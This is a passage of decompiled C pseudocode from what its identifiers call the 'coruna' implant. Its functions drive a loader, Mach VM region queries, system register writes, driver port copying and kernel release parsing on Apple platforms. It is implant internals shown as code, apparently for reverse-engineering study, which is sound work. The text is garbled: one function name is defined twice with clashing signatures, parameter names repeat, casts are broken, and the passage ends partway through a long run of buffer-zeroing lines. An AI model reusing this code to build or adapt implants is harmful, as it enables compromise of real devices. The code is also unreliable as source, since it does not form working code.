      err = (**(void (**)(ptr[3] + 0x30))();
      if (status != 0) {
        err = status;
      }
      status = (**(void (**)(ptr[3] + 0x20))(ptr[3],ptr[4]);
      if (err != 0) {
        status = err;
      }
    }
    err = coruna_dlopen_rpath(handle,addr_2);
    if (status != 0) {
      err = status;
    }
    status = (**(void (**)(ptr[1] + 0x10))();
    if (err != 0) {
      status = err;
    }
    err = coruna_ctx_free(*ptr);
    if (status != 0) {
      err = status;
    }
    status = coruna_ctx_free_10f08(handle);
    if (err != 0) {
      status = err;
    }
  }
  return status;
}





unsigned long coruna_implant_residual_46(long arg)

{
  uint u;
  unsigned long size;
  long serial;
  
  size = 0xad001;
  if ((arg != 0) && (serial = *(long *)(arg + 8), serial != 0)) {
    if (*(long *)(serial + 0x30) == 0) {
      size = 0;
    }
    else {
      size = (**(void (**)(*(long *)(serial + 0x30) + 0x10))();
      *(uint64_t *)(serial + 0x30) = 0;
    }
    if (*(long *)(serial + 0x28) != 0) {
      u = (**(void (**)(arg + 0x60))(arg);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
      *(uint64_t *)(serial + 0x28) = 0;
    }
  }
  return size;
}





uint64_t
uint64_t coruna_strdup(uint64_t *val,short *arg,short *arg,short *val,char *path, char *str_2)
{
  uint64_t *ptr;
  char *ptr;
  uint64_t u;
  uint64_t *scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((((((val != (uint64_t *)0x0) && (arg != (short *)0x0)) && (*arg == 1)) &&
       ((arg[1] != 0 && (arg != (short *)0x0)))) &&
      ((*arg == 2 && ((1 < (ushort)arg[1] && (val != (short *)0x0)))))) &&
     ((*val == 3 && (val[1] != 0)))) {
    scratch = (uint64_t *)0x0;
    bootargs = 0;
    u = coruna_implant08_residual_56(&bootargs,&scratch);
    ptr = scratch;
    if ((int)u == 0) {
      *scratch = arg;
      scratch[1] = val;
      scratch[3] = arg;
      if (path != (char *)0x0) {
        ptr = _strdup(path);
        ptr[7] = ptr;
      }
      if (str_2 != (char *)0x0) {
        ptr = _strdup(str_2);
        ptr[9] = ptr;
      }
      *val = bootargs;
    }
  }
  return u;
}





int coruna_implant08_via_implant_residual_46_2(long handle)
{
  int err;
  int status;
  long handle;
  long addr;
  
  status = 0xad001;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    err = coruna_implant_residual_46(handle);
    handle = *(long *)(addr + 0x18);
    if ((handle != 0) &&
       (((*(void (**)(handle + 0x30) != (void (*)0x0 && (*(long *)(handle + 0x20) != 0)) &&
        (*(long *)(addr + 0x20) != 0)))) {
      status = (**(void (**)(handle + 0x30))();
      if (err != 0) {
        status = err;
      }
      err = (**(void (**)(*(long *)(addr + 0x18) + 0x20))
                        (*(long *)(addr + 0x18),*(uint64_t *)(addr + 0x20));
      if (status != 0) {
        err = status;
      }
    }
    status = coruna_ctx_free_10f08(handle);
    if (err != 0) {
      status = err;
    }
  }
  return status;
}





unsigned long coruna_bzero_2(uint64_t *arg,short *val,long n,uint64_t m,char *p,
                  char *q)

{
  uint u;
  uint size;
  int flags;
  unsigned long version;
  char *str;
  size_t ls6;
  uint64_t tag;
  char cache_40 [3];
  uint tmp_buf;
  uint8_t region[8];
  uint64_t *plist;
  uint64_t cache_37;
  
  if (arg == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (val == (short *)0x0) {
    return 0xad001;
  }
  if (*val != 2) {
    return 0xad001;
  }
  if (((ushort)val[1] < 2 || n == 0) || (int)m == 0) {
    return 0xad001;
  }
  plist = (uint64_t *)0x0;
  cache_37 = 0;
  version = coruna_implant08_residual_56(&cache_37,&plist);
  if ((int)version != 0) {
    return version;
  }
  plist[3] = val;
  version = coruna_implant08_via_ctx_free_4(plist,n,m);
  if ((int)version != 0) goto load_ok_24;
  if (p != (char *)0x0) {
    str = _strdup(p);
    plist[7] = str;
  }
  if (q != (char *)0x0) {
    str = _strdup(q);
    plist[9] = str;
  }
  str = (char *)plist[7];
  version = 0;
  if (str != (char *)0x0) {
    tag = *plist;
    ls6 = _strlen(str);
    size = coruna_pthread_rwlock_unlock(tag,0x70003,str,(int)ls6 + 1);
    u = 0;
    if (size != 0x700a) {
      u = size;
    }
    version = (unsigned long)u;
  }
  str = (char *)plist[9];
  if (str == (char *)0x0) {
load_ok_25:
    if ((int)version == 0) goto load_ok_26;
  }
  else {
    tag = *plist;
    ls6 = _strlen(str);
    version = coruna_pthread_rwlock_unlock(tag,0x70004,str,(int)ls6 + 1);
    if ((int)version != 0x700a) goto load_ok_25;
load_ok_26:
    region[0] = 1;
    tmp_buf = 0;
    cache_40[1] = '\0';
    cache_40[2] = '\0';
    version = coruna_vm_region_recurse(*(uint32_t *)k_implant_mach_task_self_slot);
    if ((int)version == 0) {
      if ((tmp_buf & 7) != 0) {
        cache_40[0] = '\0';
        flags = coruna_get_platform_serial(cache_40);
        if (flags != 0) {
          version = 0xad00b;
          goto load_ok_27;
        }
        if (cache_40[0] != '\0') {
          region[0] = 0;
        }
      }
      version = coruna_bind_loader_create(plist + 1,plist[3],0,*plist,region,1);
      if ((int)version == 0) {
        *arg = cache_37;
      }
    }
  }
load_ok_27:
  if ((int)version == 0) {
    return version;
  }
  str = (char *)plist[7];
  if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)plist[7]);
    plist[7] = 0;
  }
  str = (char *)plist[9];
  if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)plist[9]);
    plist[9] = 0;
  }
  coruna_ctx_free(*plist);
  *plist = 0;
load_ok_24:
  coruna_ctx_free_10f08(cache_37);
  return version;
}





int coruna_find_objc_methlist(long handle)
{
  int err;
  int status;
  int flags;
  uint64_t *ptr;
  
  status = 0xad001;
  if ((handle != 0) && (ptr = *(uint64_t **)(handle + 8), ptr != (uint64_t *)0x0)) {
    err = coruna_implant_residual_46(handle);
    status = (**(void (**)(ptr[1] + 0x20))();
    if (err != 0) {
      status = err;
    }
    if (ptr[4] != 0) {
      err = (**(void (**)(ptr[3] + 0x30))();
      if (status != 0) {
        err = status;
      }
      status = (**(void (**)(ptr[3] + 0x20))(ptr[3],ptr[4]);
      if (err != 0) {
        status = err;
      }
    }
    err = (**(void (**)(ptr[1] + 0x10))();
    if (status != 0) {
      err = status;
    }
    flags = coruna_ctx_free(*ptr);
    if (err != 0) {
      flags = err;
    }
    status = coruna_ctx_free_10f08(handle);
    if (flags != 0) {
      status = flags;
    }
  }
  return status;
}





uint64_t coruna_implant_via_run_starti(long handle,long addr_2)
{
  void (*ptr)(void);
  uint64_t u;
  long handle;
  long addr;
  unsigned long unaff_x30;
  
  if ((handle == 0) || (addr = *(long *)(handle + 8), addr == 0 || addr_2 == 0)) {
    return 0xad001;
  }
  if (*(char *)(addr + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  handle = *(long *)(addr + 0x30);
  if (handle == 0) {
    u = coruna_run_starti();
    if ((int)u != 0) {
      return u;
    }
    handle = *(long *)(addr + 0x30);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = (**(void (**)(handle + 0x38))(handle,addr_2);
    return u;
  }
    ___stack_chk_fail();
}





unsigned long coruna_implant_via_run_starti_2(long arg,uint64_t val,uint64_t n,int m)

{
  uint u;
  uint size;
  unsigned long type_id;
  long serial_7;
  long serial_8;
  int cache_41;
  
  type_id = 0xad001;
  if ((arg != 0) && (serial_8 = *(long *)(arg + 8), serial_8 != 0)) {
    if (*(char *)(serial_8 + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    serial_7 = *(long *)(serial_8 + 0x30);
    if (serial_7 == 0) {
      type_id = coruna_run_starti(arg);
      if ((int)type_id != 0) {
        return type_id;
      }
      serial_7 = *(long *)(serial_8 + 0x30);
    }
    cache_41 = 0;
    size = (**(void (**)(serial_7 + 0x38))(serial_7,&cache_41);
    u = size;
    if (size == 0 && cache_41 != 1) {
      u = 0xad005;
    }
    type_id = (unsigned long)u;
    if ((size == 0 && cache_41 != 1) && (m != 0)) {
      type_id = (**(void (**)(*(long *)(serial_8 + 0x30) + 0x40))();
    }
    if ((int)type_id == 0) {
      type_id = (**(void (**)(*(long *)(serial_8 + 0x30) + 0x28))(*(long *)(serial_8 + 0x30),val,n)
      ;
    }
  }
  return type_id;
}





uint64_t coruna_implant_residual_47(long handle,uint64_t val)
{
  uint64_t u;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  bootargs = 0;
  scratch = 0;
  if ((handle != 0) && (*(long *)(handle + 8) != 0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(handle + 0x68))(handle,0x20000,&bootargs,&scratch);
    if ((int)u == 0) {
      u = (**(void (**)(handle + 0x18))(handle,bootargs,scratch,val);
    }
  }
  return u;
}





uint64_t coruna_chdir_tmp(long handle)
{
  char *ptr;
  long handle;
  uint64_t u;
  long addr;
  int scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti();
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x38))(handle,&scratch);
    if ((int)u == 0) {
      if (scratch == 2) {
        ptr = _getcwd((char *)0x0,0);
        _chdir("/tmp");
        u = (**(void (**)(*(long *)(addr + 0x30) + 0x30))();
        if (ptr != (char *)0x0) {
          _chdir(ptr);
          _free(ptr);
        }
      }
      else {
        u = 0xad002;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_via_run_starti_3(long handle)
{
  uint64_t u;
  long handle;
  long addr;
  int scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti(handle);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x38))(handle,&scratch);
    if ((int)u == 0 && scratch != 1) {
      u = (**(void (**)(*(long *)(addr + 0x30) + 0x40))();
    }
  }
  return u;
}





uint64_t coruna_implant_via_run_starti_4(long handle,long addr_2,long off_3,long ctx_4,long ctx_5)
{
  void (*ptr)(void);
  uint64_t u;
  long handle;
  long addr;
  unsigned long unaff_x30;
  
  if ((handle == 0) ||
     (addr = *(long *)(handle + 8),
     (((addr == 0 || addr_2 == 0) || off_3 == 0) || ctx_4 == 0) || ctx_5 == 0)) {
    return 0xad001;
  }
  if (*(char *)(addr + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  handle = *(long *)(addr + 0x30);
  if (handle == 0) {
    u = coruna_run_starti();
    if ((int)u != 0) {
      return u;
    }
    handle = *(long *)(addr + 0x30);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = (**(void (**)(handle + 0x20))(handle,addr_2,off_3,ctx_4,ctx_5);
    return u;
  }
    ___stack_chk_fail();
}





uint64_t coruna_implant_via_run_starti_5(long handle,long addr_2)
{
  void (*ptr)(void);
  uint64_t u;
  long handle;
  long addr;
  unsigned long unaff_x30;
  
  if ((handle == 0) || (addr = *(long *)(handle + 8), addr == 0 || addr_2 == 0)) {
    return 0xad001;
  }
  if (*(char *)(addr + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  handle = *(long *)(addr + 0x30);
  if (handle == 0) {
    u = coruna_run_starti();
    if ((int)u != 0) {
      return u;
    }
    handle = *(long *)(addr + 0x30);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = (**(void (**)(handle + 0x18))(handle,addr_2);
    return u;
  }
    ___stack_chk_fail();
}





uint64_t coruna_implant_via_run_starti_6(long handle,uint32_t *size)
{
  uint64_t u;
  long handle;
  long addr;
  int scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0 && size != (uint32_t *)0x0)
     ) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti(handle);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    scratch = 0;
    u = (**(void (**)(handle + 0x18))(handle,&scratch);
    if ((int)u == 0) {
      if (scratch - 7U < 2) {
        u = 0;
        *size = 2;
      }
      else {
        u = 0xad008;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_48(long handle,long addr_2,int flags,long off_3)
{
  uint64_t u;
  long handle;
  
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8), ((handle != 0 && addr_2 != 0) && flags != 0) && off_3 != 0
     )) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x30))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_49(long handle,long addr_2,char *path,long off_3)
{
  uint64_t u;
  coruna_implant_trampoline_fn indirect_target;
  
  if ((((handle != 0) && (*(long *)(handle + 8) != 0 && addr_2 != 0)) &&
      (indirect_target = *(void (**)(addr_2 + 0x30),
      indirect_target != (void (*)0x0 && path != (char *)0x0)) &&
     ((*path != '\0' && (off_3 != 0)))) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
      indirect_target = *(void (**)(addr_2 + 0x30);
    }
    u = (*indirect_target)(addr_2,path,off_3);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_copy_port_1918(long handle,long addr_2)
{
  uint64_t u;
  coruna_implant_trampoline_fn indirect_target;
  
  if (((handle != 0) && (*(long *)(handle + 8) != 0 && addr_2 != 0)) &&
     (indirect_target = *(void (**)(addr_2 + 0x28), indirect_target != (void (*)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
      indirect_target = *(void (**)(addr_2 + 0x28);
    }
    u = (*indirect_target)(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_50(long handle,uint64_t val,uint64_t *id_2,uint32_t *size)
{
  uint64_t u;
  long *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8),
     (ptr != (long *)0x0 && id_2 != (uint64_t *)0x0) && size != (uint32_t *)0x0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      bootargs = 0;
      scratch = 0;
      u = (**(void (**)(*ptr + 0x18))(*ptr,val,&bootargs,&scratch);
      if ((int)u == 0) {
        *id_2 = bootargs;
        *size = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_driver_copy_port_1918(long handle,uint64_t val,long addr_2,int flags)
{
  uint64_t u;
  long *ptr;
  
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8), (ptr != (long *)0x0 && addr_2 != 0) && flags != 0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      u = (**(void (**)(*ptr + 0x30))();
      return u;
    }
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_51(long handle,uint64_t *val,uint32_t *size)
{
  uint64_t u;
  long *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8),
     (ptr != (long *)0x0 && val != (uint64_t *)0x0) && size != (uint32_t *)0x0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      bootargs = 0;
      scratch = 0;
      u = (**(void (**)(*ptr + 0x20))(*ptr,&bootargs,&scratch);
      if ((int)u == 0) {
        *val = bootargs;
        *size = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_52(long handle,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && id_2 != (uint64_t *)0x0)
     ) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle == 0) {
      u = 0xad00a;
    }
    else {
      u = (**(void (**)(handle + 0x18))(handle,val,&scratch);
      if ((int)u == 0) {
        *id_2 = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_53(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x28))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_residual_54(long handle,long addr_2,long off_3,int flags)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8), ((handle != 0 && addr_2 != 0) && off_3 != 0) && flags != 0
     )) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x40))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_residual_55(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x30))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_via_macho_iface_create(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*(long *)(handle + 0x18) != 0) {
      u = coruna_macho_iface_create(*(long *)(handle + 0x18));
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint coruna_parse_xnu_release(long handle,size_t *len)
{
  mach_port_t host;
  uint u;
  int err;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  char host_info [520];
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if ((handle == 0) || (*(long *)(handle + 8) == 0 || len == (size_t *)0x0))
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
  return u;
  }
  ___stack_chk_fail();
  if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  host_info[0x1e8] = '\0';
  host_info[0x1e9] = '\0';
  host_info[0x1ea] = '\0';
  host_info[0x1eb] = '\0';
  host_info[0x1ec] = '\0';
  host_info[0x1ed] = '\0';
  host_info[0x1ee] = '\0';
  host_info[0x1ef] = '\0';
  host_info[0x1e0] = '\0';
  host_info[0x1e1] = '\0';
  host_info[0x1e2] = '\0';
  host_info[0x1e3] = '\0';
  host_info[0x1e4] = '\0';
  host_info[0x1e5] = '\0';
  host_info[0x1e6] = '\0';
  host_info[0x1e7] = '\0';
  host_info[0x1f8] = '\0';
  host_info[0x1f9] = '\0';
  host_info[0x1fa] = '\0';
  host_info[0x1fb] = '\0';
  host_info[0x1fc] = '\0';
  host_info[0x1fd] = '\0';
  host_info[0x1fe] = '\0';
  host_info[0x1ff] = '\0';
  host_info[0x1f0] = '\0';
  host_info[0x1f1] = '\0';
  host_info[0x1f2] = '\0';
  host_info[499] = '\0';
  host_info[500] = '\0';
  host_info[0x1f5] = '\0';
  host_info[0x1f6] = '\0';
  host_info[0x1f7] = '\0';
  host_info[0x1c8] = '\0';
  host_info[0x1c9] = '\0';
  host_info[0x1ca] = '\0';
  host_info[0x1cb] = '\0';
  host_info[0x1cc] = '\0';
  host_info[0x1cd] = '\0';
  host_info[0x1ce] = '\0';
  host_info[0x1cf] = '\0';
  host_info[0x1c0] = '\0';
  host_info[0x1c1] = '\0';
  host_info[0x1c2] = '\0';
  host_info[0x1c3] = '\0';
  host_info[0x1c4] = '\0';
  host_info[0x1c5] = '\0';
  host_info[0x1c6] = '\0';
  host_info[0x1c7] = '\0';
  host_info[0x1d8] = '\0';
  host_info[0x1d9] = '\0';
  host_info[0x1da] = '\0';
  host_info[0x1db] = '\0';
  host_info[0x1dc] = '\0';
  host_info[0x1dd] = '\0';
  host_info[0x1de] = '\0';
  host_info[0x1df] = '\0';
  host_info[0x1d0] = '\0';
  host_info[0x1d1] = '\0';
  host_info[0x1d2] = '\0';
  host_info[0x1d3] = '\0';
  host_info[0x1d4] = '\0';
  host_info[0x1d5] = '\0';
  host_info[0x1d6] = '\0';
  host_info[0x1d7] = '\0';
  host_info[0x1a8] = '\0';
  host_info[0x1a9] = '\0';
  host_info[0x1aa] = '\0';
  host_info[0x1ab] = '\0';
  host_info[0x1ac] = '\0';
  host_info[0x1ad] = '\0';
  host_info[0x1ae] = '\0';
  host_info[0x1af] = '\0';
  host_info[0x1a0] = '\0';
  host_info[0x1a1] = '\0';
  host_info[0x1a2] = '\0';
  host_info[0x1a3] = '\0';
  host_info[0x1a4] = '\0';
  host_info[0x1a5] = '\0';
  host_info[0x1a6] = '\0';
  host_info[0x1a7] = '\0';
  host_info[0x1b8] = '\0';
  host_info[0x1b9] = '\0';
  host_info[0x1ba] = '\0';
  host_info[0x1bb] = '\0';
  host_info[0x1bc] = '\0';
  host_info[0x1bd] = '\0';
  host_info[0x1be] = '\0';
  host_info[0x1bf] = '\0';
  host_info[0x1b0] = '\0';
  host_info[0x1b1] = '\0';
  host_info[0x1b2] = '\0';
  host_info[0x1b3] = '\0';
  host_info[0x1b4] = '\0';
  host_info[0x1b5] = '\0';
  host_info[0x1b6] = '\0';
  host_info[0x1b7] = '\0';
  host_info[0x188] = '\0';
  host_info[0x189] = '\0';
  host_info[0x18a] = '\0';
  host_info[0x18b] = '\0';
  host_info[0x18c] = '\0';
  host_info[0x18d] = '\0';
  host_info[0x18e] = '\0';
  host_info[399] = '\0';
  host_info[0x180] = '\0';
  host_info[0x181] = '\0';
  host_info[0x182] = '\0';
  host_info[0x183] = '\0';
  host_info[0x184] = '\0';
  host_info[0x185] = '\0';
  host_info[0x186] = '\0';
  host_info[0x187] = '\0';
  host_info[0x198] = '\0';
  host_info[0x199] = '\0';
  host_info[0x19a] = '\0';
  host_info[0x19b] = '\0';
  host_info[0x19c] = '\0';
  host_info[0x19d] = '\0';
  host_info[0x19e] = '\0';
  host_info[0x19f] = '\0';
  host_info[400] = '\0';
  host_info[0x191] = '\0';
  host_info[0x192] = '\0';
  host_info[0x193] = '\0';
  host_info[0x194] = '\0';
  host_info[0x195] = '\0';
  host_info[0x196] = '\0';
  host_info[0x197] = '\0';
  host_info[0x168] = '\0';
  host_info[0x169] = '\0';
  host_info[0x16a] = '\0';
  host_info[0x16b] = '\0';
  host_info[0x16c] = '\0';
  host_info[0x16d] = '\0';
  host_info[0x16e] = '\0';
  host_info[0x16f] = '\0';
  host_info[0x160] = '\0';
  host_info[0x161] = '\0';
  host_info[0x162] = '\0';
  host_info[0x163] = '\0';
  host_info[0x164] = '\0';
  host_info[0x165] = '\0';
  host_info[0x166] = '\0';
  host_info[0x167] = '\0';
  host_info[0x178] = '\0';
  host_info[0x179] = '\0';
  host_info[0x17a] = '\0';
  host_info[0x17b] = '\0';
  host_info[0x17c] = '\0';
  host_info[0x17d] = '\0';
  host_info[0x17e] = '\0';
  host_info[0x17f] = '\0';
  host_info[0x170] = '\0';
  host_info[0x171] = '\0';
  host_info[0x172] = '\0';
  host_info[0x173] = '\0';
  host_info[0x174] = '\0';
  host_info[0x175] = '\0';
  host_info[0x176] = '\0';
  host_info[0x177] = '\0';
  host_info[0x148] = '\0';
  host_info[0x149] = '\0';
  host_info[0x14a] = '\0';
  host_info[0x14b] = '\0';
  host_info[0x14c] = '\0';
  host_info[0x14d] = '\0';
  host_info[0x14e] = '\0';
  host_info[0x14f] = '\0';
  host_info[0x140] = '\0';
  host_info[0x141] = '\0';
  host_info[0x142] = '\0';
  host_info[0x143] = '\0';
  host_info[0x144] = '\0';
  host_info[0x145] = '\0';
  host_info[0x146] = '\0';
  host_info[0x147] = '\0';
  host_info[0x158] = '\0';
  host_info[0x159] = '\0';
  host_info[0x15a] = '\0';
  host_info[0x15b] = '\0';
  host_info[0x15c] = '\0';
  host_info[0x15d] = '\0';
  host_info[0x15e] = '\0';
  host_info[0x15f] = '\0';
  host_info[0x150] = '\0';
  host_info[0x151] = '\0';
  host_info[0x152] = '\0';
  host_info[0x153] = '\0';
  host_info[0x154] = '\0';
  host_info[0x155] = '\0';
  host_info[0x156] = '\0';
  host_info[0x157] = '\0';
  host_info[0x128] = '\0';
  host_info[0x129] = '\0';
  host_info[0x12a] = '\0';
  host_info[299] = '\0';
  host_info[300] = '\0';
  host_info[0x12d] = '\0';
  host_info[0x12e] = '\0';
  host_info[0x12f] = '\0';
  host_info[0x120] = '\0';
  host_info[0x121] = '\0';
  host_info[0x122] = '\0';
  host_info[0x123] = '\0';
  host_info[0x124] = '\0';
  host_info[0x125] = '\0';
  host_info[0x126] = '\0';
  host_info[0x127] = '\0';
  host_info[0x138] = '\0';
  host_info[0x139] = '\0';
  host_info[0x13a] = '\0';
  host_info[0x13b] = '\0';
  host_info[0x13c] = '\0';
  host_info[0x13d] = '\0';
  host_info[0x13e] = '\0';
  host_info[0x13f] = '\0';
  host_info[0x130] = '\0';
  host_info[0x131] = '\0';
  host_info[0x132] = '\0';
  host_info[0x133] = '\0';
  host_info[0x134] = '\0';
  host_info[0x135] = '\0';
  host_info[0x136] = '\0';
  host_info[0x137] = '\0';
  host_info[0x108] = '\0';
  host_info[0x109] = '\0';
  host_info[0x10a] = '\0';
  host_info[0x10b] = '\0';
  host_info[0x10c] = '\0';
  host_info[0x10d] = '\0';
  host_info[0x10e] = '\0';
  host_info[0x10f] = '\0';
  host_info[0x100] = '\0';
  host_info[0x101] = '\0';
  host_info[0x102] = '\0';
  host_info[0x103] = '\0';
  host_info[0x104] = '\0';
  host_info[0x105] = '\0';
  host_info[0x106] = '\0';
  host_info[0x107] = '\0';
  host_info[0x118] = '\0';
  host_info[0x119] = '\0';
  host_info[0x11a] = '\0';
  host_info[0x11b] = '\0';
  host_info[0x11c] = '\0';
  host_info[0x11d] = '\0';
  host_info[0x11e] = '\0';
  host_info[0x11f] = '\0';
  host_info[0x110] = '\0';
  host_info[0x111] = '\0';
  host_info[0x112] = '\0';
  host_info[0x113] = '\0';
  host_info[0x114] = '\0';
  host_info[0x115] = '\0';
  host_info[0x116] = '\0';
  host_info[0x117] = '\0';
  host_info[0xe8] = '\0';
  host_info[0xe9] = '\0';
  host_info[0xea] = '\0';
  host_info[0xeb] = '\0';
  host_info[0xec] = '\0';
  host_info[0xed] = '\0';
  host_info[0xee] = '\0';
  host_info[0xef] = '\0';
  host_info[0xe0] = '\0';
  host_info[0xe1] = '\0';
  host_info[0xe2] = '\0';
  host_info[0xe3] = '\0';
  host_info[0xe4] = '\0';
  host_info[0xe5] = '\0';
  host_info[0xe6] = '\0';
  host_info[0xe7] = '\0';
  host_info[0xf8] = '\0';
  host_info[0xf9] = '\0';
  host_info[0xfa] = '\0';
  host_info[0xfb] = '\0';
  host_info[0xfc] = '\0';
  host_info[0xfd] = '\0';
  host_info[0xfe] = '\0';
  host_info[0xff] = '\0';
  host_info[0xf0] = '\0';
  host_info[0xf1] = '\0';
  host_info[0xf2] = '\0';
  host_info[0xf3] = '\0';
  host_info[0xf4] = '\0';
  host_info[0xf5] = '\0';
  host_info[0xf6] = '\0';
  host_info[0xf7] = '\0';
  host_info[200] = '\0';
  host_info[0xc9] = '\0';
  host_info[0xca] = '\0';
  host_info[0xcb] = '\0';
  host_info[0xcc] = '\0';
  host_info[0xcd] = '\0';
  host_info[0xce] = '\0';
  host_info[0xcf] = '\0';
